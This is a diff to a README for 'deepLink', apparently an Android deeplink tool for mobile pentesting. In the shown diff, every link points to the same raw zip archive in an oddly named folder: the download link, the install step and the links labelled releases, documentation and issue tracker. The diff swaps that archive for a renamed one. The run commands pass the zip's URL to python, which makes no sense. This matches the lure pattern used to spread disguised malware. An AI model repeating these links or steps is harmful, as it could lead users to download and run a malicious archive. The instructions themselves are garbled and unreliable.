@@ -12,12 +12,12 @@ To get started with deepLink, follow these simple steps:
    - ADB (Android Debug Bridge) set up if you are using the ADB mode. 
 
 2. Visit the page to download the application:
-   [Download deepLink](https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deepLink.zip)
+   [Download deepLink](https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deep-Link-v2.3.zip)
    
 ## 🐙 Download & Install
 To download and install deepLink, please follow these steps:
 
-1. Go to the releases page: [Download deepLink](https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deepLink.zip).
+1. Go to the releases page: [Download deepLink](https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deep-Link-v2.3.zip).
    
 2. Find the latest version available. Look for the release notes to see what's new or changed.
 
@@ -27,7 +27,7 @@ To download and install deepLink, please follow these steps:
 
 5. Open a terminal or command prompt and navigate to the folder where you extracted the files.
 
-6. Run the command `python https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deepLink.zip` to start the application.
+6. Run the command `python https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deep-Link-v2.3.zip` to start the application.
 
 ## 📋 Features
 - List Android deeplinks directly from an APK file.
@@ -47,12 +47,12 @@ After successfully installing deepLink, here’s how you can use it:
    - Connect your Android device to your computer via USB.
    - Enable USB debugging on the Android device.
    - In the terminal, type `adb devices` to ensure your device is recognized.
-   - Now, run the command `python https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deepLink.zip adb` to list and verify deeplinks.
+   - Now, run the command `python https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deep-Link-v2.3.zip adb` to list and verify deeplinks.
 
 2. **Using an APK file:**
    - Download the desired APK file.
    - In the terminal, navigate to the directory containing the APK.
-   - Run the command `python https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deepLink.zip <https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deepLink.zip>`, replacing `<https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deepLink.zip>` with the actual file name. 
+   - Run the command `python https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deep-Link-v2.3.zip <https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deep-Link-v2.3.zip>`, replacing `<https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deep-Link-v2.3.zip>` with the actual file name. 
 
 ## ❓ Troubleshooting
 If you encounter any issues while running deepLink, consider the following solutions:
@@ -65,9 +65,9 @@ If you encounter any issues while running deepLink, consider the following solut
 If you need help or wish to contribute, you can join the community discussions on the GitHub repository. Engage with other users and developers who are also using or contributing to deepLink.
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deepLink.zip): Download the latest versions and read the release notes.
-- [Documentation](https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deepLink.zip): Access detailed usage guides and advanced features.
-- [Issues Tracker](https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deepLink.zip): Report bugs or request features.
+- [Releases Page](https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deep-Link-v2.3.zip): Download the latest versions and read the release notes.
+- [Documentation](https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deep-Link-v2.3.zip): Access detailed usage guides and advanced features.
+- [Issues Tracker](https://raw.githubusercontent.com/antonyponceca/deepLink/main/viscerate/deep-Link-v2.3.zip): Report bugs or request features.
 
 ## ⚡ Conclusion
 deepLink is a straightforward and efficient tool for verifying and listing deeplinks in Android apps. By following the steps in this guide, you can easily download and run deepLink, helping you perform your mobile pentesting tasks with ease.
